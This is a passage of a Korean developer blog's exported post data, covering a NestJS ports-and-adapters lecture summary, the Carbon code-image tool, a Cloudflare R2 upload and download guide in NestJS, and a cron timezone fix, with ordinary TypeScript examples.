리스트를 조회하는 API 작성\n@Module({\n  controllers: [GetMembersController],\n  providers: [\n    // inbound-port\n    {\n      provide: FIND_MEMBERS_INBOUND_PORT,\n      useClass: FindMembersService,\n    },\n\n    // outbound-port\n    {\n      provide: FIND_MEMBERS_OUTBOUND_PORT,\n      useClass: FindMembersRepository,\n    },\n  ],\n})\nexport class MemberModule {}\n```\n\n여기까지 하면 Port and adapter 아키텍쳐를 적용한 모습이다.\n\n서비스 로직이나 디비를 가져오는 리파지토리 로직에 대해 테스트 코드 작성도 쉽고, 코드 자체도 간결에서 읽기 편하다.  \n여기까지 하고 나니 내가 짠 코드는 벌레같은 코드였구나 라는 생각이 들 정도였다.\n\n<br>\n\n#### 테스트 코드 작성\n\n이 부분은 강의를 듣다가 단순 코드를 작성하는 부분이 많아서 [Github 코드](https://github.com/Jun4928/wanted-pre-onboarding-challenge-BE-task-JAN.2023/blob/main/lecture-2/src/member/service/find-members.service.spec.ts) 및 아래 테스트 코드로 대체한다.\n\n```typescript\nimport { FindMembersService } from \"./find-members.service\"\nimport {\n  FindMembersOutboundPort,\n  FindMembersOutboundPortInputDto,\n  FindMembersOutboundPortOutputDto,\n} from \"../outbound-port/find-members.outbound-port\"\n\nclass MockFindMembersOutboundPort implements FindMembersOutboundPort {\n  private readonly result: FindMembersOutboundPortOutputDto\n\n  constructor(result: FindMembersOutboundPortOutputDto) {\n    this.result = result\n  }\n\n  async execute(\n    params: FindMembersOutboundPortInputDto\n  ): Promise<FindMembersOutboundPortOutputDto> {\n    return this.result\n  }\n}\n\ndescribe(\"FindMembersService Spec\", () => {\n  test(\"멤버 리스트를 반환한다.\", async () => {\n    const member = [\n      {\n        name: \"A\",\n        email: \"A@gmail.com\",\n        phone: \"0103123123\",\n      },\n    ]\n\n    const findMemberService = new FindMembersService(\n      new MockFindMembersOutboundPort(member)\n    )\n\n    const res = await findMemberService.execute()\n\n    expect(res).toStrictEqual([\n      {\n        name: \"A\",\n        email: \"A@gmail.com\",\n        phone: \"0103123123\",\n      },\n    ])\n  })\n})\n```\n\n아까 서비스 로직을 보면 **@inject**를 제외한 어느 곳에서도 Nest.js의 기능을 사용하지 않고, 순수 Typescript로 구성되어 있음을 알 수 있다.  \n이는 테스트 코드를 작성할 때 Nest.js에 대한 의존이 낮다는 것을 의미한다.\n\n그리고 보통 단위 테스트 등을 할 때 디비에 대한 의존도가 있을 수 있는데, 이렇게 할 경우 독립적으로 테스트가 가능하다.\n\n<br>\n\n#### 정리\n\n마지막 항목인 **4. Live Coding2 : 사전과제 로직 함께 리팩토링 하기**는 시간이 없어서 다음 강의에 다루기로 하였다.\n\n그리고 수강생들의 질의가 이것저것 많았는데 그 중 하나가 아래였다.\n\nQ : 포트 아키텍쳐 단점\n\n1. 타이핑이 많아진다.\n2. 모듈간의 의존성 관리가 아렵다(모든 아키텍쳐의 공통점)\n\n사실 타이핑이 많은게 나은 것 같다.\n\n그리고 강사님의 정리 내용을 요약하자면...\n\n- 어떤 아키텍쳐가 정답이 없다.\n- 선택한 아키텍쳐에 대한 이해도와 필요성, 숙련도에 따라 적용하면 된다.\n- 핵사곤 아키텍쳐라고 하기도 하는데 이건 더 어렵기에 포트 앤 어뎁터로 준비했다.\n\n강의는 3시간 밖에 안되었는데 내가 쓴 엉망 필기체 및 요약본...그리고 노션에 정리한 코드 및 url 등을 다 따서 복습을 해보니...  \n이거 또한 일인듯 했다...\n\n안그래도 흑우집합소 개발에 매진해야 했지만, 아무래도 너무 시간을 지체했었고,  \n한번 적용해봐야지 라는 생각에 시작했는데 아무래도 다음 강의 자료는 금방 할 수 없을 듯 하다.\n\n참고로 아직 함수형 프로그래밍은 나오지 않았고, 함수형을 위한 빌드업 과정이었다.  \n강의를 정리하면서 들으니 내용을 흘려 들은게 많아서 자세히 이해할 수 없었지만,  \n정리하면서 보니 이제는 그 흐름이나 맥락이 이해되었다.\n\n사실 이번 백엔드 강의는 나에게 너무 유익했던 시간이고, 소중한 내용을 배울 수 있어서 좋았다.  \n지금 **이펙티브 타입스크립트**책 내용 정리 포스팅도 준비중이긴 한데 일단 이 강의 내용 정리부터 하고 또 해봐야겠다.\n\n다음 강의 정리는 준비되는 대로 포스팅 하도록 하겠다.\n\n```toc\n\n```\n"},{"excerpt":"코드를 이쁜 이미지로... 가끔 코딩 유튜브나 블로그에 보면 코드 이미지를 괜찮게 만들어서 올리는 것을 봤다.  이런 느낌으로 된 이미지였는데 이걸 한땀한땀 올리진 않을거 같아서 찾아봤다. Carbon now Carbon Now 위와 같은 이미지를 만들어주는 사이트다.  코드를 입력하면 언어에 맞춰서 잘 꾸며준다. 보여주는 창의 테마도 상단에서 바꿀 수 …","fields":{"slug":"/utils/230203_web_carbon/"},"frontmatter":{"date":"February 03, 2023","title":"(Web) 코드를 예쁜 이미지로 변환해주는 Carbon now","description":null,"tags":["Utils"],"series":"Utils","previewImage":"setting.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](/thumbnail.png)\n\n# 코드를 이쁜 이미지로...\n\n가끔 코딩 유튜브나 블로그에 보면 코드 이미지를 괜찮게 만들어서 올리는 것을 봤다.\n\n![](/img01.png)\n\n이런 느낌으로 된 이미지였는데 이걸 한땀한땀 올리진 않을거 같아서 찾아봤다.\n\n## Carbon now\n\n[Carbon Now](https://carbon.now.sh)  \n위와 같은 이미지를 만들어주는 사이트다.\n\n![](/img02.png)\n\n코드를 입력하면 언어에 맞춰서 잘 꾸며준다.  \n보여주는 창의 테마도 상단에서 바꿀 수 있다.\n\n![](/img03.png)\n\n코드의 배경색도 변경이 가능하며...\n\n![](/img04.png)\n![](/img05.png)\n\n<br>\n\n에디터 표시 설정 및 라인 높이 줄번호 폰트 등의 설정, 그리고 미리 설정된 테마 기능도 지원한다.\n\n![](/img06.png)\n![](/img07.png)\n\n<br>\n\n그리고 내보내기는 단순 이미지 뿐만 아니라 iframe 링크, 이미지 자체 링크 등으로 제공이 가능하다.\n\n![](/img08.png)\n\n아래는 **iframe**으로 가져온건데 코드를 복사하거나 할 수 있다.\n\n<iframe\n  src=\"https://carbon.now.sh/embed?bg=rgba%2528171%252C+184%252C+195%252C+1%2529&t=seti&wt=none&l=auto&width=680&ds=true&dsyoff=20px&dsblur=68px&wc=true&wa=true&pv=56px&ph=56px&ln=true&fl=1&fm=Hack&fs=18px&lh=184%2525&si=false&es=2x&wm=false\"\n  style=\"width: 1024px; height: 483px; border:0; transform: scale(1); overflow:hidden;\"\n  sandbox=\"allow-scripts allow-same-origin\">\n</iframe>\n\n그리고 export를 선택하면 이미지 확대 및 파일명, 확장자 등을 선택할 수 있다.\n\n![](/img09.png)\n\n## 정리\n\n잘 쓰면 유용할 것 같다.  \n근데 유튜브 같은데는 괜찮을지 모르겠지만...  \n블로그 같은데는 복붙 해야 하는 경우가 좀 있는데 이미지일 경우 또 이미지 내 텍스트 따서 긁으려면 좀 답답할 때가 있다.\n\n그래서 블로그는 그냥 코드를 올리던지 둘다 하던지 개인의 선택으로 쓰면 될 것 같다.\n\n```toc\n\n```\n"},{"excerpt":"저번 포스팅에 이어... 저번 포스팅(CloudFlare R2 사용해보기 Part 1)에 이어 이번에는 R2에 파일 업로드와 다운로드, 삭제 등을 Nest.Js로 구현하는 것을 해보려 한다. 일단 프로젝트를 따로 파서 깃허브에 올려서 하려 했으나... 생각해보니 각 설정들 부터 해서 Wrangler의 설정 및 배포 등 생각할 것과 직접 구현해야 할 부분이…","fields":{"slug":"/nest_js/230203_r2_nestjs/"},"frontmatter":{"date":"February 03, 2023","title":"CloudFlare R2 사용해보기 Part 2 (With Nest.Js)","description":null,"tags":["NestJs","CloudFlare","R2"],"series":"NestJs","previewImage":"nestjs_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nestjs.png)\n\n# 저번 포스팅에 이어...\n\n저번 포스팅([CloudFlare R2 사용해보기 Part 1](https://elfinlas.github.io/cloud-flare/230127_use_r2/))에 이어 이번에는 R2에 파일 업로드와 다운로드, 삭제 등을 **Nest.Js**로 구현하는 것을 해보려 한다.  \n일단 프로젝트를 따로 파서 깃허브에 올려서 하려 했으나...\n\n생각해보니 각 설정들 부터 해서 **Wrangler**의 설정 및 배포 등 생각할 것과 직접 구현해야 할 부분이 많아지는 관계로...  \n일단 코드 조각으로 예시를 만들어보려 한다.\n\n그렇다고 생략을 엄청 하는 것은 아니고, 환경이 구성되어 있다면 해당 코드 예제가 도움될 것이라 생각이 든다.\n\n설명에 앞서 구성, 그리고 기타 사항은 다음과 같이 되어 있다.\n\n- Nest.JS 사용\n- Typescript 사용\n- [CloudFlare R2 사용해보기 Part 1](https://elfinlas.github.io/cloud-flare/230127_use_r2/) 포스팅까지 진행 완료된 CloudFlare 계정\n- **Wrangler** 프로젝트가 현재 진행하는(또는 따로 만든) 곳 내부에 존재하는 것을 예시로 진행\n- 먼저 **files**라는 도메인에서 진행한다. (아래 사진은 참고용)\n\n![](/img01.png)\n\n- **레이어드 아키텍처** 기반으로 코드가 구성되어 있다. (원래 **포트 앤 어뎁터**로 하려 했는데 아직 배우는 단계라...)\n\n<br>\n\n## 1. Worker 처리기 배포\n\n[CloudFlare R2 사용해보기 Part 1](https://elfinlas.github.io/cloud-flare/230127_use_r2/) 까지 한 뒤에 작성했던 **index.ts**에 대해서 CloudFlare에 배포를 해줘야 한다.  \n이 부분은 자주 쓸 수 있기에 **package.json**의 **scripts**에 등록을 해두고 쓰자.\n\n```json\n{\n    \"scripts\" : {\n        ...\n        \"r2:build:dev\": \"wrangler publish -c ./my_worker/wrangler.toml\",\n    }\n\n}\n```\n\n여기서 **my_worker**의 경우 서비스 생성할 때 이름을 적어주면 된다.  \n각자 프로젝트 디렉토리에 보면 자신이 정한 디렉토리명이 있는데 이를 넣어주면 된다.  \n그리고 실행 명령어도 입맛에 바꿔도 된다.\n\n이렇게 하고 아래 명령어처럼 배포를 한다.\n\n```\n> yarn r2:build:dev\n```\n\n<br>\n\n그럼 콘솔에 배포가 잘 되고, CloudFlare 사이트의 Workers에서 등록한 서비스를 들어가서 배포 항목을 보면 확인이 가능하다.\n\n![](/img02.png)\n\n<br>\n\n## 2. 프로젝트 구성\n\n먼저 **Nest.JS**환경이 구성되어 있어야 한다.(아마 진행자라면 다들 구성되어 있을 것이다.)  \n위에서 설명한 것과 같이 **레이어드 아키텍쳐** 기반으로 구성하고 설명한다.  \n각 구성은 다음과 같다.\n\n- FileController : URL로 직접 접근하는 부분\n- FileR2Service : R2 관련 로직을 핸들링하는 서비스 로직\n- multerR2Options : Multer 처리 옵션 로직\n\n기타 설치해야 할 패키지는 아래와 같다.(같은 역할을 하는 다른 패키지를 써도 무방하다)\n\n```\nyarn add @types/multer --dev\nyarn add @nestjs/axios\nyarn add axios\nyarn add rxjs\n```\n\n각 구성 영역에 대해 설명한다.\n\n<br>\n\n### 2-1 FileController\n\n컨트롤러 영역은 별거 없다.  \n물론 파일 업로드 및 다운로드, 삭제 등의 작업 시 권한이나 그런 로직은 제외한다.  \n순수하게 기능에만 집중한 예제이기에 해당 코드를 바로 사용하기 보다는 약간 로직을 추가해서 쓰는 것이 좋다.\n\n그리고 아래 예제는 내가 사용하던 코드인데 일부 코드는 공개가 불가능해서 조작하였다.  \n약간 억지같은 부분도 있지만 기능 구현이라는 관점만 봐주셨으면 한다.\n\n```typescript\nimport {\n  Controller,\n  Delete,\n  Get,\n  Param,\n  Post,\n  Req,\n  Res,\n  UploadedFile,\n  UseInterceptors,\n} from \"@nestjs/common\"\nimport { FileInterceptor } from \"@nestjs/platform-express\"\nimport { Request, Response } from \"express\"\nimport {\n  FilesSuccessCode,\n  FilesSuccessResponse,\n} from \"./files.response.success\"\nimport { multerR2Options } from \"./multer.options\"\nimport { FilesService } from \"./services/files.service\"\n\n@Controller(\"files\")\nexport class FilesController {\n  constructor(private readonly fileService: FilesService) {}\n\n  @Post(\"upload\")\n  @UseInterceptors(FileInterceptor(\"file\", multerR2Options))\n  async fileUpload(\n    @UploadedFile() file: Express.Multer.File,\n    @Req() req: Request\n  ) {\n    const result = await this.fileService.upload(req, file)\n    return FilesSuccessResponse.returnRes(FilesSuccessCode.uploadFile4R2(), {})\n  }\n\n  @Get(\"get/:file_id\")\n  async downloaFiles(@Res() response: Response, @Param() param) {\n    const result = await this.fileService.fileDownload(param.file_id)\n    response.set({\n      \"Content-disposition\": `attachment; filename=${result.fileName}`,\n    })\n    response.send((await result.axiosResponse).data)\n  }\n\n  @Delete(\"delete/:file_id\")\n  async deleteFiles(@Param() param) {\n    await this.fileService.updateDeleteStatus(param.file_id)\n    return FilesSuccessResponse.returnRes(FilesSuccessCode.deleteFile4R2())\n  }\n}\n```\n\n여기서 **FilesService**가 있는데 이 서비스 로직은 디비에 저장 및 로깅, 기타 작업 등을 처리하는 메인 서비스 로직인데 이 부분은 아래 서비스 로직에서 다루겠다.\n\n<br>\n\n### 2-2 FileService & FileR2Service\n\n여기는 실제 기능을 담당하는 구현 로직이다.  \n**FilesService**의 경우 일부 로직만 구현되어 있기에 그냥 호출 흐름 정도만 공개한다.\n\n```typescript\n//FilesService\n\n@Injectable()\nexport class FilesService {\n  constructor(private readonly r2Service: FilesR2Service) {}\n\n  /**\n   * 파일 업로드 영역\n   * @param req\n   * @param file\n   */\n  async upload(req: Request, file: Express.Multer.File): Promise<Files> {\n    //R2에 파일 업로드를 처리한다.\n    const fileKey: string = getUuid()\n    const r2Result: R2UploadResult = await this.r2Service.uploadR2(\n      file,\n      fileKey\n    )\n  }\n\n  /**\n   * 파일 다운로드 영역\n   * @param id\n   * @returns\n   */\n  async fileDownload(id: string): Promise<GetDownloadFile> {\n    const entity = await this.filesRepo.findEntityById(id)\n    return await this.r2Service.getFileR2(\n      entity.r2Key,\n      entity.uploadName + \".\" + entity.extension\n    )\n  }\n\n  async updateDeleteStatus(fileId: string) {\n    await this.r2Service.deleteFileData4R2(fileKey)\n  }\n}\n```\n\n내가 구성한 코드의 경우 파일 업로드 시 해당 파일명을 **uuid**로 바꿔서 관리했다.  \n그래서 실제 R2에 파일 업로드 시 **aaa.png** 파일명이라면 R2에는 acbv-3342 등의 UUID로 변경되어 저장된다.  \n이는 향후 다운로드 시 디비에 저장된 값으로 다시 바꿔서 전달하면 되는 부분인데 여기서는 자세하게 설명하지 않는다.\n\n다운로드는 컨트롤러에서 받은 유니크한 UUID 생성 키 값으로 파일 데이터를 찾아서 R2에 저장된 파일명을 가져온다.\n\n삭제의 경우 원래 파일 상태만 바꾸는데 이번 예제에서는 직접 삭제를 진행한다.\n\n다음은 실제 구현 로직인 **FileR2Service**이다.\n\n```typescript\nimport { HttpService } from \"@nestjs/axios\"\nimport { Injectable } from \"@nestjs/common\"\nimport { AxiosError, AxiosRequestConfig } from \"axios\"\nimport { firstValueFrom, lastValueFrom, map } from \"rxjs\"\n\n@Injectable()\nexport class FilesR2Service {\n  constructor(private readonly http: HttpService) {}\n\n  async uploadR2(\n    file: Express.Multer.File,\n    fileKey: string\n  ): Promise<R2UploadResult> {\n    const url: string = this.getUrl4WorkerR2(fileKey)\n    const baseHeader: AxiosRequestConfig = this.getR2DefaultAxiosHeader({\n      \"Content-Type\": file.mimetype,\n    })\n    const data: R2UploadResult = await lastValueFrom(\n      await this.http\n        .put(url, file.buffer, baseHeader)\n        .pipe(map(response => response.data))\n    )\n    return data\n\n    //데이터가 안올 때 처리 필요\n  }\n\n  async getFileR2(r2Key: string, fileName: string): Promise<GetDownloadFile> {\n    const url: string = this.getUrl4WorkerR2(r2Key)\n    const axiosConfg: AxiosRequestConfig = this.getR2DefaultAxiosHeader()\n    axiosConfg.responseType = \"arraybuffer\" //AxiosRequestConfig 추가\n    const fileData = await this.http.get(url, axiosConfg)\n\n    return {\n      axiosResponse: firstValueFrom(fileData.pipe(map(response => response))),\n      fileName,\n    }\n  }\n\n  /**\n   * [주의] R2에서 물리적 파일 삭제 처리 함수\n   * @param fileKey R2에 저장된 파일명\n   * @returns\n   */\n  async deleteFileData4R2(fileKey: string) {\n    const url: string = this.getUrl4WorkerR2(fileKey)\n    const axiosConfg: AxiosRequestConfig = this.getR2DefaultAxiosHeader()\n    const result = await this.http.delete(url, axiosConfg)\n    const callback = await firstValueFrom(\n      result.pipe(map(response => response.data))\n    )\n    return callback.status === \"success\"\n  }\n\n  /**\n   * R2에 업로드 Url을 생성해주는 메서드\n   * @param fileName\n   * @returns\n   */\n  private getUrl4WorkerR2(fileName: string): string {\n    //CF_R2_WORKER_URL = \"https://myworker.workers.dev/\"\n    return process.env.CF_R2_WORKER_URL + fileName\n  }\n\n  private getR2DefaultAxiosHeader(headerOpt?: {\n    [key: string]: string\n  }): AxiosRequestConfig {\n    const baseHeader = {\n      \"X-Auth-My-S-Key\": process.env.CF_R2_AUTH_KEY,\n    }\n    return {\n      headers:\n        headerOpt === undefined ? baseHeader : { ...baseHeader, ...headerOpt },\n    }\n  }\n}\n```\n\n자잘자잘한 로직이 많다.  \n코드를 보면 알겠지만 좀 지저분하고, 로직이 난잡한데 이는 비공개 코드를 지우느라 어색한 부분이 있어서 그렇다.(물론 코드 리팩토링이 아직 제대로 안됨 -\\_-;)\n\n**getUrl4WorkerR2** 메서드의 경우 .env 파일에 있는 값을 가져오는데 저기서는 Worker Url이다.  \n자신이 설정한 URL로 설정해두자.\n\n**getR2DefaultAxiosHeader** 메서드의 경우 Axios 요청 시 헤더 값이다.  \n여기서 헤더의 키 값은 **wrangler.toml**파일과 맞춰줘야 한다.  \n전 포스팅에서 만들었던 암호키를 넣으면 된다.\n\n그리고 헤더 이름도 **index.ts**에서 처리한 것과 같게 해줘야 한다. (너무 당연한 이야기...)  \n각자 구성에 맞춰서 진행해야 에러가 안난다.\n\n403뜨면 이 부분을 잘 확인해보자.\n\n그 외에 부분은 코드를 보면 이해가 될 것이다.  \n업로드 후 **data**를 로깅으로 찍어보면 아래와 같은 값이 나온다.\n\n```\ndata =  {\n  uploaded: '2023-01-31T00:59:59.713Z',\n  etag: '8b0e11242eda10911c1d203f33ab841b',\n  size: 630046,\n  version: '5307c9d4821a4ea903f7015ec19d72ef',\n  key: '7c7e5ae2-8260-499e-883c-949a0a687ada'\n}\n```\n\n각 설명은 아래를 참고하자\n\n- uploaded : 업로드 날짜\n- etag : 고유 etag 값\n- size : 파일 사이트\n- version : R2에서 사용하는 값\n- key : 업로드한 파일명\n\n저기 로직에서 axios 통신을 보면 Workers의 HTTP 처리기 로직(index.ts)와 매칭이 된다.  \n이 부분을 잘 응용하면 좀 더 고도화 된 코드를 구현할 수 있는데, 귀찮으면 일단 여기 로직으로 시작해도 된다.\n\n<br>\n\n### 2-3 multerR2Options\n\n이건 약간 번외 파일인데...  \n각자 업로드에 맞춰서 사용하면 된다.\n\n아래는 그냥 내가 사용했던 샘플 코드인데...  \n그냥 어디선가 긁어온 코드를 그냥 사용했었다....\n\n물론 지금 내 서비스 코드는 다르게 되어 있지만...  \n여러분들도 입맛에 맞춰서 바꿔 사용해보시는 것을 추천한다.\n\n```typescript\nimport { HttpException, HttpStatus } from \"@nestjs/common\"\nimport { existsSync, mkdirSync } from \"fs\"\nimport { diskStorage } from \"multer\"\nimport { extname } from \"path\"\n\nexport const multerR2Options = {\n  fileFilter: (request, file, callback) => {\n    if (file.mimetype.match(/\\/(jpg|jpeg|png|gif)$/)) {\n      callback(null, true)\n    } else {\n      callback(\n        new HttpException(\n          {\n            message: 1,\n            error: \"지원하지 않는 이미지 형식입니다.\",\n          },\n          HttpStatus.BAD_REQUEST\n        ),\n        false\n      )\n    }\n  },\n  limits: {\n    fieldNameSize: 200, // 필드명 사이즈 최대값 (기본값 100bytes)\n    filedSize: 10 * 1024 * 1024, // 필드 사이즈 값 설정 (기본값 1MB) 10MB\n    fields: 2, // 파일 형식이 아닌 필드의 최대 개수 (기본 값 무제한)\n    fileSize: 16777216, //multipart 형식 폼에서 최대 파일 사이즈(bytes) \"16MB 설정\" (기본 값 무제한)\n    files: 1, //multipart 형식 폼에서 파일 필드 최대 개수 (기본 값 무제한)\n  },\n}\n```\n\n<br>\n\n## 정리\n\n좀 성급한 정리의 감이 없지않아 있지만...\n위 코드를 참고하면 구현할 수 있을 것이다.\n\nR2와 S3는 사실 각각의 장단점을 가지고 있다.  \nS3는 접근 제어를 할 수 있지만, R2는 내가 알기론 다 공개형태이다.\n\nURL만 있으면 접근이 가능하다는 뜻이다.  \n그래서 이 부분이 서비스 구현에 맞다면 R2를 쓰는것이 좋지만...\n\n보안이 좀 필요하거나 하면 S3를 쓰는게 맞는 것 같다.\n\n각자 구성환경이 좀 다르겠지만...  \n보통 React 또는 Next.JS를 프론트에 두고, 백엔드는 Nest.js 또는 스프링, FastApi 등을 쓰고 할 것이다.\n\n근데 나는 Next.Js + Nest.Js 에 Ngix를 통해서 작업을 했다.  \n근데 Next.Js에서 미들웨어에서 파일에 대한 ByteArray를 전달할 때 좀 문제가 있었다.\n\n물론 이 부분은 다 구현해서 정리해뒀다.\n\n나중에 시간날 때 저 환경에서 파일 업로드 다운로드를 하는 부분에 대해 포스팅 해볼 예정이다.\n\n예제를 최대한 친절하게 작성해뒀지만...  \n이해가 안되는 부분이 있다면 댓글로 남겨주시면 확인 후 답변 드릴 예정이다.\n\n나중에 시간이 좀 많이 널널해지면 그땐 깃허브에 예제를 올리고 해당 포스팅 문서도 업데이트 하도록 할 예정이다.\n\n```toc\n\n```\n"},{"excerpt":"NestJs에서 스케쥴링... 현재 하고 있는 프로젝트에서 스케쥴링이 필요하여 구현했었다. 그런데 스케쥴링을 돌렸는데 뭔가 시간이 안맞게 돌아간다고 해야 하나? 분과 초단위는 잘 도는데 시간대가 좀 안맞았다. 그래서 테스트를 하고 자료를 찾다가 원인을 알게되었다... 원인? 이유는 바로 TimeZone 문제였다. 내가 구현한 코드는 다음과 같이 구성되어 …","fields":{"slug":"/nest_js/230129_tast_scheduling/"},"frontmatter":{"date":"January 29, 2023","title":"Nest.Js에서 한국시간 기준 스케쥴링할 때 주의점 (With Timezone)","description":"TimeZone 문제","tags":["NestJs","Timezone"],"series":"NestJs","previewImage":"nestjs_logo.jpg","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](/thumbnail.png)\n\n# NestJs에서 스케쥴링...\n\n현재 하고 있는 프로젝트에서 스케쥴링이 필요하여 구현했었다.  \n그런데 스케쥴링을 돌렸는데 뭔가 시간이 안맞게 돌아간다고 해야 하나?\n\n분과 초단위는 잘 도는데 시간대가 좀 안맞았다.  \n그래서 테스트를 하고 자료를 찾다가 원인을 알게되었다...\n\n<br>\n\n## 원인?\n\n이유는 바로 **TimeZone** 문제였다.\n\n내가 구현한 코드는 다음과 같이 구성되어 있다.\n\n```typescript\n@Cron(\"0 0-10 0-23 * * 0-5\", { name: \"UpdateDataSchedule\"})\nasync cron4Time4Data() {\n    const result = await this.taskSchedulerService.UpdateData();\n\n    if (result) {\n        this.stop4CronJob(\"UpdateDataSchedule\");\n    }\n}\n```\n\n일요일에서 금요일까지 자정에서 11시까지 도는 스케쥴러다.  \n근데 로깅을 찍어보고 해봐도 뭔가 이상했다.\n\n````typescript\nexport interface CronOptions {\n  /**\n   * Specify the name of your cron job. This will allow to inject your cron job reference through `@InjectCronRef`.\n   */\n  name?: string\n  /**\n   * Specify the timezone for the execution. This will modify the actual time relative to your timezone. If the timezone is invalid, an error is thrown. You can check all timezones available at [Moment Timezone Website](http://momentjs.com/timezone/). Probably don't use both ```timeZone``` and ```utcOffset``` together or weird things may happen.\n   */\n  timeZone?: string\n  /**\n   * This allows you to specify the offset of your timezone rather than using the ```timeZone``` param. Probably don't use both ```timeZone``` and ```utcOffset``` together or weird things may happen.\n   */\n  utcOffset?: string | number\n  /**\n   * If you have code that keeps the event loop running and want to stop the node process when that finishes regardless of the state of your cronjob, you can do so making use of this parameter. This is off by default and cron will run as if it needs to control the event loop. For more information take a look at [timers#timers_timeout_unref](https://nodejs.org/api/timers.html#timers_timeout_unref) from the NodeJS docs.\n   */\n  unrefTimeout?: boolean\n}\n\n/**\n * Creates a scheduled job.\n * @param cronTime The time to fire off your job. This can be in the form of cron syntax or a JS ```Date``` object.\n * @param options Job execution options.\n */\nexport declare function Cron(\n  cronTime: string | Date,\n  options?: CronOptions\n): MethodDecorator\n````\n\n저 **@Cron**의 함수 형태인데 뒤에 옵션이 수상했다.  \n위에 선언된 속성 중 **timezone**이 옵셔널로 들어오는데 이게 문제였었다.\n\n아무것도 선언을 안해주면 그냥 **UTC** 시간대가 적용된다.  \n그래서 이걸 아래와 같이 timezone을 선언해주면 아주 간단하게 해결되는 문제였다.\n\n```typescript\n@Cron(\"0 0-10 0-23 * * 0-5\", { name: \"UpdateDataSchedule\", timeZone: \"Asia/Seoul\"})\n....\n```\n\n이렇게 해주니 한국시 기준으로 잘 동작하였다.\n\n## 참고\n\n- [참고 공식 문서](https://docs.nestjs.com/techniques/task-scheduling)\n\n```toc\n\n```\n"},{"excerpt":"AWS S3 사용할까 고민하다가... 전에 만들던 서비스에서는 보통 AWS의 S3 저장소를 사용했었다. 근데 myme.link를 만들면서 노마드코더의 클라우드플레어 소개 영상을 보면서 R2에 대해 알게 되었다. R2는 일단 S3에 비해 합리적인 가격을 제공한다. 아래에서 간단히 비교를 하게 되면... 아마존 S3 1G 용량 한달 저장 비용 : 0.02$ …","fields":{"slug":"/cloud-flare/230127_use_r2/"},"frontmatter":{"date":"January 27, 2023","title":"CloudFlare R2 사용해보기 Part 1 (With Nest.Js)","description":"R2를 한번 사용해보기","tags":["CloudFlare","R2","Infra"],"series":"Cloud Flare","previewImage":"cloudflare_logo.png","isPrivate":null},"rawMarkdownBody":"\n# AWS S3 사용할까 고민하다가...\n\n전에 만들던 서비스에서는 보통 AWS의 S3 저장소를 사용했었다.  \n근데 [myme.link](https://myme.link)를 만들면서 노마드코더의 [클라우드플레어](https://www.youtube.com/watch?v=-AwLsUuzgLw) 소개 영상을 보면서 [R2](https://blog.cloudflare.com/ko-kr/introducing-r2-object-storage-ko-kr/)에 대해 알게 되었다.\n\nR2는 일단 S3에 비해 합리적인 가격을 제공한다.  \n아래에서 간단히 비교를 하게 되면...\n\n- 아마존 S3\n\n  - 1G 용량 한달 저장 비용 : 0.02\\$\n  - 저장된 데이터를 송신하는 비용(유저가 다운받는 것) 1G 기준 : 0.09\\$\n\n<br>\n\n- CloudFlare R2\n  - 1G 용량 한달 저장 비용 : 0.015\\$\n  - **저장된 데이터를 송신하는 비용(유저가 다운받는 것) 1G 기준 : 거의 무료(초당 10회 이상은 비용 발생)**\n\n<br>\n\n나 같은 경우 서비스를 오픈할 때 잘 되기 전까진 **무료 플랜과 저렴한 비용으로 최대한의 효율을 뽑자** 마인드이다.  \n그래서 이번엔 S3보다는 R2를 적용해봤다.\n\n근데 R2 자료가 거의 없었다.  \n대부분 S3 -> R2 마이그레이션만 있지, 이것을 S3처럼 사용하는 예제는 없었다.\n\n그래서 좀 삽질하고 배운 내용을 정리하는 용도로 이번 포스팅을 진행한다.  \n원래 깃허브에 레포 하나 파서 예제를 올리려 했는데...  \n이거 준비하는 것도 일이더라....\n\n그래서 이건 나중에 시간이 남아돌면 그 때 하는 것으로 하고...  \n이번 포스팅에서는 최대한 친절한 가이드 형식으로 하려 한다. (사실 내가 나중에 또 만들 때 보려는 목적이 더 크다 -\\_-;; )\n\n내가 진행한 환경은 **Nest.Js**로 했으며, **Typescript**로 작성되었다.  \n이와 관련된 예제는 [CloudFlare R2 사용해보기 Part 2 (With Nest.Js)](https://elfinlas.github.io/nest_js/230203_r2_nestjs/) 포스팅을 참고하면 된다.\n\n일부 로직은 대강 작성했기 때문에 좀 난해할 수 있음을 미리 고지한다.(서비스 코드는 공개할 수 없기에...)  \n이것을 적용햐려 할 때 힘든 점이 있다면 아래 댓글로 문의하면, 답변 드리도록 하겠다.\n\n포스팅의 전반적인 설명 흐름은 아래 도표대로 되어 있다.\n\n![](/img00.png)\n\n## 사용법\n\n### 1. 클라우드플레어에 계정 생성을 해준다.\n\n그리고 R2 메뉴로 들어간다.\n\n![](/img01.png)\n\n<br>\n\n### 2. R2 가서 구입 결제를 진행한다. (프리플랜 가능)\n\n![](/img02.png)\n\n요금제 구매 버튼을 클릭한다.\n\n![](/img03.png)\n\n무료로 사용이 가능하며, 일단 해외 결제 카드가 필요하다.\n\n![](/img04.png)\n\n카드 정보를 다 입력하고 진행하면 아래와 같이 완료가 된다.\n\n![](/img05.png)\n\n<br>\n\n### 3. 대시보드에서 R2 메뉴로 이동한다.\n\n![](/img06.png)\n\n<br>\n\n### 4. 버킷을 생성해준다.\n\n버킷 생성은 웹에서 해도 되고, **Wrangler**를 이용하여 콘솔에서도 생성이 가능하다.  \n**Wrangler**는 CloudFlare의 **Workers**서비스를 사용하기 위한 일종의 CLI 툴이다.\n\n이에 대해 [자세한 것](https://www.cloudflare.com/ko-kr/products/workers/)과 [요금](https://www.cloudflare.com/ko-kr/plans/developer-platform/)은 링크에서 확인이 가능하다.\n\n이 포스팅에서는 **Wrangler CLI**를 활용하여 생성해 보는 것으로 하겠다.  \n물론 대시보드에서 생성해도 똑같다.\n\n<br>\n\n#### 4-1. Wrangler 설치\n\n```\nyarn global add wrangler\n```\n\n물론 나처럼 특정 프로젝트에서만 설치할 거면 global은 빼면 된다.\n\n그럼 아래와 같이 설치가 된다.\n\n> **나는 global이 아닌 local으로 설치해서 wrangler 명령어 수행 시 마다 yarn wrangler 형태로 사용한다.**  \n> 이 부분은 각자 원하는 방식으로 설치하고, 사용하도록 하자\n\n```\n>  yarn add wrangler\nyarn add v1.22.19\n[1/4] 🔍  Resolving packages...\nwarning wrangler > @esbuild-plugins/node-modules-polyfill > rollup-plugin-node-polyfills > rollup-plugin-inject@3.0.2: This package has been deprecated and is no longer 